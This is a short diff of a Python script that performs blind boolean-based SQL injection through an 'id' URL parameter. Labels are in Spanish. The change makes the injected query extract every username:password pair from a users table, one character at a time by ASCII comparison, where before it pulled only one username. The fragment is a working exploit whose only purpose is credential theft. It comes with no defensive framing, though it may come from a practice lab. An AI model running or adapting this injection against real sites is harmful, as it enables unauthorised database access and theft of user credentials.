@@ -25,14 +25,14 @@ def makeSQLI():
 
     time.sleep(2)
 
-    p2 = log.progress("Datos extraídos")
+    p2 = log.progress("Datos extraídos (username:password) ")
 
     extracted_info = ""
 
 
     for position in range(1,50):
         for character in range(33, 127):
-            sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id=1)=%d)" % (position,character)
+            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1)=%d)" % (position,character)
             p1.status(sqli_url)
             r = requests.get(sqli_url)
             
